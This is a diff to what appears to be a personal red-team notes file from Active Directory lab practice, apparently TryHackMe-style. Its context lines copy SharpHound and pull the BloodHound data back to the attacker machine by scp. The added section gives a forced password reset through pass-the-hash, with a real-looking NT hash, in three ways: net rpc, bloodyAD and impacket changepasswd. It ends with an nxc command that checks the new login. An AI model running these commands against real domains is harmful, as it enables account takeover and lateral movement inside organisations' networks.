@@ -544,5 +544,31 @@ copy C:\Tools\Sharphound.exe ~\Documents\
 # ================= In attacker Machine =======================================#
 scp henry.murphy@THMJMP1.za.tryhackme.com:C:/Users/henry.murphy/Documents/20261007112621_BloodHound.zip .
 
+
+#################################################### FORCE PASS CHANGE ###########################################################
+bash
+net rpc password "PETER" 'P*!er!@23' \
+  -U "dataspace.local/jason%91e4841325a8f5e49a12065290618bd3" \
+  --pw-nt-hash \
+  -S 192.168.159.129
+
+That flag makes net treat 91e4841325a8f5e49a12065290618bd3 as jason’s NT hash instead of a password.
+
+Honestly though, net rpc PtH is finicky — bloodyAD/impacket are more reliable for this:
+
+bash
+# bloodyAD (cleanest)
+bloodyAD --host 192.168.159.129 -d dataspace.local -u jason \
+  -p ':91e4841325a8f5e49a12065290618bd3' set password PETER 'P*!er!@23'
+
+# or impacket
+changepasswd.py dataspace.local/PETER@192.168.159.129 \
+  -reset -newpass 'P*!er!@23' -altuser jason -althash 91e4841325a8f5e49a12065290618bd3
+
+Verify:
+
+bash
+nxc smb 192.168.159.129 -u PETER -p 'P*!er!@23'
+
                                                                
 ```
